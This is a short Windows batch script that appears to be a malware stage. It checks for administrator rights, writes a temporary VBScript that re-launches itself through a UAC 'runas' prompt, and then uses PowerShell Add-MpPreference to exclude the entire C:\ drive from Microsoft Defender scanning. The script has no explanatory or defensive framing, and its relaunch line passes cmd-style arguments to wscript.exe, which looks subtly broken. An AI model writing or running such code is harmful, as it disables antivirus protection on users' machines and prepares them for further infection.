@echo off
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

REM
if '%errorlevel%' NEQ '0' (
    goto Chelovek
) else ( goto gotem )

:Chelovek
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getselling.vbs"
    set params = %*:"="
    echo UAC.ShellExecute "wscript.exe", "/c %~s0 %params%", "", "runas", 1 >> "%temp%\getselling.vbs"

    "%temp%\getselling.vbs"
    del "%temp%\getselling.vbs"
    exit /B

:gotem
    pushd "%CD%"
    CD /D "%~dp0"


powershell.exe -command Add-MpPreference -ExclusionPath C:\